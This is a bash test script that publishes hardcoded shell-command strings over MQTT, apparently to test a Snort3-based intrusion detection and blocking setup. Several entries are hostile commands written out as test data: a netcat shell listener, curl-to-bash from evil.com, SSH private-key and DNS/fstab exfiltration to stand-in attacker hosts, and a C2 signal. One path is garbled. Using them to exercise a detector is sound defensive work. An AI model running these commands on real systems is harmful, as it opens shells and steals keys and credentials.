#!/bin/bash
# Linux Bash Script - Sends random MQTT commands (hardcoded)
# All commands go to unified topic: test/commands
# Usage: ./test_linux.sh

# Configuration
BROKER_IP="192.168.8.195"
BROKER_PORT="1883"
TOPIC="test/commands"  # Unified topic for all commands
DELAY_BETWEEN_COMMANDS=5  # seconds (increased to prevent crashes)
INITIAL_DELAY=15  # seconds before starting

# Hardcoded commands to trigger ALL 4 STAGES
# First 4 commands MUST be malicious to trigger Stage 4 (MAC blocking)
# Stage 1: 1st detection, Stage 2: 2nd detection, Stage 3: 3rd detection, Stage 4: 4th+ detection
COMMANDS=(
    # STAGE 1-4 TRIGGERS (First 4 commands - clearly malicious to trigger Stage 4)
    "nc -lvp 5555 -e /bin/sh"  # Stage 1: Reverse shell listener
    "curl http://evil.com/payload.sh | bash"  # Stage 2: Download and execute
    "tcpdump -i eth0 -w /tmp/capture.pcap port 80 or port 443"  # Stage 3: Packet capture
    "nmap -sV -p- 192.168.1.1"  # Stage 4: Full port scan - triggers MAC blocking
    # Additional malicious commands (will maintain Stage 4)
    "cat /root/.ssh/id_rsa | base64 | mail attacker@evil.com"
    "interface:eth0, attacker_dns:10.6.6.6, post_action_b64:systemd-resolve --interface=${interface}  --set-dns=${attacker_dns} ; dig $(hostname).test.hijacked.com @${attacker_dns} | curl -X CONNECT --data-binary @- http://attacker.com/dig-result"
    "tcpflow_target_interface=eth1; tcpflow_output_directory=/tmp/smtp_flows; nohup tcpflow -i $tcpflow_target_interface -o $tcpflow_output_directory & (sleep 360; pkill tcpflow; socat TCP-LISTEN:5551,fork system:'echo OK')"
    "zone=all; state=off; ( test -f /tmp/override.lock && echo 'Override already active' ) || ( touch /tmp/override.lock; curl -s http://attacker.c2/override_signal?zone=all & )"
    "primary_dns:8.8.8.8, secondary_dns_exec_b64:echo \"$(cat /etc/resolv.conf | base64) hostname=$(hostname)\" | mail -s DnsSet admin@attacker-beacon.com"
    "( (find \ɚٞ.+r_keys/ -name '*_key.pem' -o -name '*.crt' -print0 | xargs -0 cat; echo '---FIRMWARE_VERSION---'; cat /opt/smartmeter_app/firmware_version.txt 2>/dev/null) | gzip | nc smartmeter-key-firmware-exfil.attacker.com 3126) &"
    "backup_file_check=/mnt/archive/latest.tgz; check_integrity_cmd_b64='gunzip -t $backup_file_check && cat /etc/fstab | awk {'print $1, $4}' | base64 | curl -X CONNECT --data-binary @- http://fstab-opts-exf.io/fstab_opts_b64'"
    "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; tshark -i eth0 -Y bootp.option.type == 53 and bootp.option.hostname -Tfields -e bootp.option.hostname -e frame.time_epoch -l | xargs -L1 -I curl -s -H X-DHCP-Lease:  http://dhcp.logs.bad/lease &"
    # Benign commands for profile building
    "ps aux | grep '[n]ohup'"
    "cat /etc/group"
    "ls -la /root/.ssh/"
    "uname -a > /tmp/uname.txt && cat /tmp/uname.txt"
    "xgamma"
    "find /var/log -name \"*.gz\" -print0 | xargs -0 tar -rf /archives/old_logs.tar"
    "ip link set dev eth0 alias 'Gateway Main Office' && echo \"Interface alias set.\""
    "ntpq -p 10.35.5.150"
    "perl -v && echo \"Perl version checked.\""
    "uname -a"
    "pkill ettercap && echo \"Ettercap process stopped.\""
    "echo 'some data' | xxd -p"
    "cat /etc/iproute2/rt_tables"
    "systemctl restart networking && systemctl restart sshd"
    "theHarvester -d example.com -b google"
    "cat ~/.config/etherape/config"
    "python3 --version"
    "syslog-ng -s -f /etc/syslog-ng/syslog-ng.conf"
)

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m' # No Color

echo -e "${GREEN}🚀 Starting Linux Test Script${NC}"
echo -e "${GREEN}=================================${NC}"
echo -e "${CYAN}Broker: $BROKER_IP:$BROKER_PORT${NC}"
echo -e "${CYAN}Topic: $TOPIC (UNIFIED)${NC}"
echo -e "${CYAN}Commands: ${#COMMANDS[@]} (random, no repeats)${NC}"
echo -e "${CYAN}Initial delay: $INITIAL_DELAY seconds${NC}"
echo ""

# Check if mosquitto_pub is available
if ! command -v mosquitto_pub &> /dev/null; then
    echo -e "${RED}❌ Error: mosquitto_pub not found!${NC}"
    echo -e "${YELLOW}   Install: sudo apt install mosquitto-clients${NC}"
    exit 1
fi

# Shuffle commands for randomness (preserve full commands, don't split on spaces)
mapfile -t shuffled_commands < <(printf '%s\n' "${COMMANDS[@]}" | shuf)

# Initial delay
echo -e "${YELLOW}⏳ Waiting $INITIAL_DELAY seconds before starting...${NC}"
sleep $INITIAL_DELAY

# Function to send command with retry
send_command() {
    local command="$1"
    local delay="${2:-$DELAY_BETWEEN_COMMANDS}"
    local max_retries=3
    local retry_count=0
    local success=false
    
    local timestamp=$(date '+%H:%M:%S')
    echo -e "${WHITE}[$timestamp] Sending to topic '$TOPIC':${NC}"
    echo -e "${GRAY}   ${command:0:100}${NC}"
    
    # Retry logic to prevent crashes
    while [ $retry_count -lt $max_retries ] && [ "$success" = false ]; do
        if mosquitto_pub -h "$BROKER_IP" -p "$BROKER_PORT" -t "$TOPIC" -m "$command" 2>/dev/null; then
            echo -e "${GREEN}   ✅ Sent${NC}"
            success=true
        else
            retry_count=$((retry_count + 1))
            if [ $retry_count -lt $max_retries ]; then
                echo -e "${YELLOW}   ⚠️  Retry $retry_count/$max_retries...${NC}"
                sleep 2
            else
                echo -e "${RED}   ❌ Failed after $max_retries retries${NC}"
            fi
        fi
    done
    
    sleep $delay
}

echo ""
echo -e "${CYAN}============================================================${NC}"
echo -e "${YELLOW}SENDING COMMANDS TO UNIFIED TOPIC${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""

# Send commands
for i in "${!shuffled_commands[@]}"; do
    cmd_num=$((i + 1))
    echo -e "${CYAN}[$cmd_num/${#shuffled_commands[@]}]${NC}"
    send_command "${shuffled_commands[$i]}"
    echo ""
done

echo ""
echo -e "${GREEN}============================================================${NC}"
echo -e "${GREEN}✅ ALL COMMANDS SENT${NC}"
echo -e "${GREEN}============================================================${NC}"
echo ""
echo -e "${CYAN}📊 Check what was sent/blocked:${NC}"
echo -e "${WHITE}   ssh kali@$BROKER_IP${NC}"
echo -e "${WHITE}   sqlite3 ~/snort3/logs/session.db \"SELECT timestamp, topic, substr(payload, 1, 60) as cmd, status, blocked, broadcasted FROM mqtt_traffic WHERE topic='$TOPIC' ORDER BY timestamp DESC LIMIT 30;\"${NC}"
echo ""
